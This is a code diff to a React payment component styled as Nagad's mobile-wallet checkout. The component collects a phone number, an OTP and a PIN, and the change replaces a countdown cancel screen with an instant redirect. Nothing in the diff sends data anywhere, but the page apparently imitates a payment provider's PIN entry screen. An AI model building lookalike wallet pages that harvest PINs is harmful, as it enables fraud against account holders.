@@ -8,8 +8,7 @@ const NagadPayment = () => {
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
-  const [showCancelView, setShowCancelView] = useState(false);
-  const [cancelTimer, setCancelTimer] = useState(5);
+  
   const [otpValue, setOtpValue] = useState("");
   const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
   const [language, setLanguage] = useState<'bn' | 'en'>('en');
@@ -26,20 +25,9 @@ const NagadPayment = () => {
     setTimeout(() => {
       if (showPinView) pinInputRefs.current[0]?.focus();
       else if (showOtpView) otpInputRef.current?.focus();
-      else if (!showCancelView) phoneInputRefs.current[0]?.focus();
+      else phoneInputRefs.current[0]?.focus();
     }, 100);
-  }, [showOtpView, showPinView, showCancelView]);
-
-  useEffect(() => {
-    let interval: NodeJS.Timeout;
-    if (showCancelView && cancelTimer > 0) {
-      interval = setInterval(() => setCancelTimer((p) => p - 1), 1000);
-    }
-    if (showCancelView && cancelTimer === 0) {
-      navigate("/payment-cancelled?channel=GenZ Direct Debit&reason=Method not Selected&amount=434.00");
-    }
-    return () => clearInterval(interval);
-  }, [showCancelView, cancelTimer, navigate]);
+  }, [showOtpView, showPinView]);
 
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   const getPhoneNumber = () => phoneDigits.join("");
@@ -88,8 +76,7 @@ const NagadPayment = () => {
     setOtpResent(true);
   };
   const handleClose = () => {
-    setShowCancelView(true);
-    setCancelTimer(5);
+    navigate("/payment-cancelled?channel=GenZ Direct Debit&reason=Method not Selected&amount=434.00");
   };
 
   // Translations
@@ -163,32 +150,7 @@ const NagadPayment = () => {
           </div>
         </div>
 
-        {/* Content area */}
         <div className="flex-1 flex flex-col justify-evenly min-h-0">
-          {showCancelView ? (
-            <>
-              {/* Cancel View */}
-              <div className="flex flex-col items-center justify-center flex-1">
-                <div className="w-12 h-12 rounded-full border-2 border-white/60 flex items-center justify-center mb-4">
-                  <span className="text-white text-2xl font-bold">✕</span>
-                </div>
-                <h2 className="text-[#ccc] text-base font-bold mb-2">
-                  {language === 'bn' ? 'পেমেন্ট বাতিল হয়েছে' : 'Payment Cancelled'}
-                </h2>
-                <p className="text-[#ccc] text-xs font-bold">
-                  {language === 'bn' ? 'মার্চেন্ট ওয়েবসাইটে রিডাইরেক্ট হচ্ছে' : 'Redirecting to'}{' '}
-                  <span className="underline">{language === 'bn' ? 'মার্চেন্ট ওয়েবসাইট' : 'Merchant Website'}</span>
-                  {' '}{language === 'bn' ? `${cancelTimer} সেকেন্ডে` : `in ${cancelTimer}s`}
-                </p>
-              </div>
-
-              {/* Nagad Logo */}
-              <div className="flex justify-center shrink-0 mb-4">
-                <img src={nagadLogoWhite} alt="Nagad" className="h-12 object-contain" />
-              </div>
-            </>
-          ) : (
-            <>
               {/* Cart Icon & Title */}
               <div className="flex flex-col items-center shrink-0">
                 <img src={cartIcon} alt="Cart" className="w-16 h-16 mb-2 object-contain" />
@@ -273,8 +235,6 @@ const NagadPayment = () => {
               <div className="flex justify-center shrink-0">
                 <img src={nagadLogoWhite} alt="Nagad" className="h-12 object-contain" />
               </div>
-            </>
-          )}
         </div>
       </div>
     </div>
